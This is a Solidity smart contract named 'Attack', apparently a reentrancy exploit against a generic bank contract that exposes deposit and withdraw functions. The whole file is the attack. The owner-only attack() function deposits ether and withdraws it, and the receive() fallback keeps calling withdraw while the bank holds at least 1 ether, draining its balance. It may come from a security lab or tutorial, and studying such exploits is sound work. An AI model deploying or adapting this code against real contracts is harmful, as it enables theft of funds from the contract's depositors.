
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.19;

interface IBank {
    function deposit()  external payable;
    function withdraw(uint256) external;
}

contract Attack {
    address public owner;
    IBank public bank;

    constructor(address _bankaddress) {
        owner = msg.sender;
        bank = IBank(_bankaddress);
    }

    function attack() public payable {
        require(msg.sender == owner, "Unauthorized");
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(msg.value);
        }
    }
}